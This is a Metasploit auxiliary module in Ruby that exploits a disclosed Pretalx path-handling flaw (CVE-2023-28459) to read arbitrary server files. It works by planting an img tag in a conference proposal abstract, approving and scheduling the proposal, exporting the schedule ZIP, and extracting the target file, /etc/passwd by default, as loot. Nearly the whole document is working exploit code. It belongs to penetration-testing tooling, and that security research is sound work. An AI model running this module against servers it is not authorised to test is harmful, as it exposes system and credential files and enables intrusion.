##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'zip'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Pretalx
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Pretalx Arbitrary File Read/Limited File Write',
        'Description' => 'This module exploits functionality in Pretalx that export conference schedule as zipped file. The Pretalx will iteratively include any file referenced by any HTML tag and does not properly check the path of the file, which can lead to arbitrary file read. The module requires credentials that allow schedule export, schedule release and approval of proposals. Additionally, module requires conference name and URL for media files.',
        'Author' => [
          'Stefan Schiller', # security researcher
          'msutovsky-r7' # module dev
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-28459'], # file read
          ['CVE', '2023-28458'], # file write
          ['URL', 'https://www.sonarsource.com/blog/pretalx-vulnerabilities-how-to-get-accepted-at-every-conference/'],
          ['URL', 'https://pretalx.com/p/news/security-release-232/']
        ],
        'DisclosureDate' => '2023-03-07',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),
      OptString.new('MEDIA_URL', [true, 'Prepend path to file path that allows arbitrary read', '/media']),
      OptString.new('EMAIL', [true, 'User email to Pretalx backend']),
      OptString.new('PASSWORD', [true, 'Password to Pretalx backend'])
    ])
    register_advanced_options([
      OptInt.new('ExportTimeout', [true, 'Set wait time for schedule export', 5])
    ])
  end

  def check_host(_ip)
    return Exploit::CheckCode::Unknown('Login failed, please check credentials') unless login(datastore['EMAIL'], datastore['PASSWORD'])

    version = get_version

    return Exploit::CheckCode::Detected('Pretalx detected but unable to determine version') unless version

    return Exploit::CheckCode::Appears("Detected vulnerable version #{version}") if version <= Rex::Version.new('2.3.1')

    return Exploit::CheckCode::Safe("Detected version #{version} is not vulnerable")
  rescue UnexpectedResponseError
    return Exploit::CheckCode::Unknown('Received unexpected response, check your options')
  rescue VersionCheckError
    return Exploit::CheckCode::Detected('Pretalx detected, failed to verify version')
  rescue CsrfError
    return Exploit::CheckCode::Unknown('Failed to get CSRF token')
  rescue SessionCookieError
    return Exploit::CheckCode::Detected('Pretalx detected, failed to get session cookie - check your credentials')
  end

  def run_host(ip)
    vprint_status('Register malicious proposal')

    proposal_info = {
      abstract: %<(<img src="#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}"/>>,
      email: datastore['EMAIL'],
      password: datastore['PASSWORD']
    }

    registration_info = register_proposal(proposal_info)
    proposal_name = registration_info[:proposal_name]
    vprint_status("Submit proposal #{proposal_name}")

    vprint_status("Logging with credentials: #{datastore['EMAIL']}/#{datastore['PASSWORD']}")
    fail_with(Failure::NoAccess, 'Incorrect credentials') unless login(datastore['EMAIL'], datastore['PASSWORD'])

    vprint_status('Approving proposal')
    approve_proposal(proposal_name)

    vprint_status("Adding #{proposal_name} to schedule")
    fail_with(Failure::Unknown, 'Failed to add submission to schedule') unless add_proposal_to_schedule(proposal_name)
    vprint_status('Releasing schedule')
    release_schedule

    vprint_status('Exporting schedule')
    export_zip

    vprint_status('Wait for schedule ZIP to be exported')

    sleep(datastore['ExportTimeout'])

    vprint_status('Trying to extract target file')

    zip_data = download_zip
    fail_with(Failure::UnexpectedReply, 'The schedule export returned no ZIP data') if zip_data.blank?

    begin
      zip = Zip::File.open_buffer(zip_data)
      target_entry = zip.find_entry("#{datastore['CONFERENCE_NAME']}#{datastore['MEDIA_URL']}#{datastore['FILEPATH']}")
      fail_with Failure::PayloadFailed, 'Failed to extract target file, check if export worked' unless target_entry
      extracted_content = zip.read(zip.find_entry(target_entry))
    rescue Zip::Error => e
      elog('Failed to read the Pretalx schedule export ZIP', error: e)
      fail_with(Failure::UnexpectedReply, 'The schedule export is not a readable ZIP archive')
    end
    fail_with(Failure::NotFound, 'The exported file is empty; no file content was recovered') if extracted_content.empty?

    # The exporter falls back to a view response when a local file is missing,
    # discarding its HTTP status before writing its body to the archive.
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => "#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}",
      'encode' => true,
      'headers' => { 'Accept' => 'text/html' }
    })
    fail_with(Failure::Unreachable, 'The asset probe did not respond; the exported file could not be verified') unless res

    if res.code == 404 && res.body.blank?
      fail_with(Failure::UnexpectedReply, 'The asset probe returned an empty HTTP 404 response; the exported file could not be verified')
    end
    if exported_not_found?(extracted_content, res)
      fail_with(Failure::NotFound, 'The exported file matches the server HTTP 404 response; the file read was not confirmed')
    end

    vprint_status('Extraction successful')

    loot_path = store_loot(
      "pretalx.#{datastore['FILEPATH']}",
      'text/plain',
      ip,
      extracted_content,
      "pretalx-#{datastore['FILEPATH']}.txt",
      'Pretalx'
    )
    print_status("Stored results in #{loot_path}")

    report_vuln({
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Module #{fullname} successfully leaked file"
    })
  end

  def exported_not_found?(content, res)
    return false unless res&.code == 404
    return true if res.body == content
    return false if res.body.blank?

    documents = [Nokogiri::HTML(content), res.get_html_document]
    normalized = documents.map do |document|
      # common/error.html places phrases.base.not_found in this heading;
      # Pretalx chooses a new phrase for each request. Compare everything else.
      headings = document.css('body > div#wrapper > h2')
      return false unless headings.length == 1

      headings.first.content = ''
      document.to_html
    end
    normalized.first == normalized.last
  end

end
